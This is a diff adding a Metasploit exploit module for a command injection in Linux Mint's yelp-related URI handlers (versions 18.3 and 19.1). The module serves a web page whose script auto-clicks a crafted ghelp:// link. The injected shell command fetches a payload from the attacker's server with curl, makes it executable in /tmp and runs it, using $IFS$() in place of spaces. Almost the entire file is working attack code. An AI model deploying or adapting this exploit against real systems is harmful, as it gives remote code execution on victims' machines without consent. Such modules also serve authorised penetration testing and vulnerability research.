@@ -1,0 +1,94 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+# Exploit from github repro: https://github.com/b1ack0wl/linux_mint_poc
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Linux Mint 'yelp' URI handler command injection vulnerability",
+      'Description'    => %q{
+          This module exploits a vulnerability within the "ghelp", "help" and "man" URI handlers within 
+          Linux Mint's "ubuntu-system-adjustments" package. Invoking any one the URI handlers will call 
+          the python script "/usr/local/bin/yelp" with the contents of the supplied URI handler as its argument. 
+          The script will then search for the strings "gnome-help" or "ubuntu-help" and if doesn't find either 
+          of them it'll then execute os.system("/usr/bin/yelp %s" % args). User interaction is required to exploit 
+          this vulnerability.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'b1ack0wl' # vuln discovery and exploit dev
+        ],
+      'Payload'        =>
+        {
+          'DisableNops' => true
+        },
+      'DefaultOptions'  =>
+        {
+          'WfsDelay' => 60
+        },
+      'Platform'       => 'linux',
+      'Targets'        =>
+        [
+          [ 'Linux Mint 18.3 and 19.1',
+            {
+              'Arch' => ARCH_X64
+            } 
+          ]
+        ],
+      'Privileged'     => false,
+      'DefaultTarget'  => 0))
+  end
+
+  def generate_exploit_html()
+    if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
+      srv_host = datastore['LHOST']
+    else
+      srv_host = datastore['SRVHOST']
+    end
+    @filename = rand_text_alpha(4)
+    cmd_inj = "curl http://#{srv_host}:#{datastore['SRVPORT']}/#{@service_path} -o /tmp/#{@filename};chmod 777 /tmp/#{@filename};/tmp/#{@filename} &".gsub(' ','$IFS$()') # Cheap way to add spaces since chrome percent encodes spaces (%20).
+    html = %Q|
+    <html>
+    <head>
+      <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+      <meta content="utf-8" http-equiv="encoding">
+      <title>paparoachfanclubdotcom</title>
+    </head>
+    <body>
+    <script>
+      lmao = document.createElement('a');
+      lmao.href= "ghelp://$(#{cmd_inj})";
+      document.body.appendChild(lmao); /* Needed to work with Firefox */
+      lmao.click();
+    </script>
+    </body>
+    </html>
+    |
+    return html
+  end
+
+  def on_request_uri(cli, request)
+    agent = request.headers['User-Agent']
+    if agent =~ /curl\/\d/
+      # Command has been executed. Serve up the payload
+      exe_payload = generate_payload_exe()
+      print_status("Sending payload...")
+      send_response(cli, exe_payload)
+      register_file_for_cleanup("/tmp/#{@filename}")
+      return
+    else
+      html = generate_exploit_html()
+      print_status("Sending HTML...")
+      send_response(cli, html, {'Content-Type'=>'text/html'})
+    end
+  end
+end
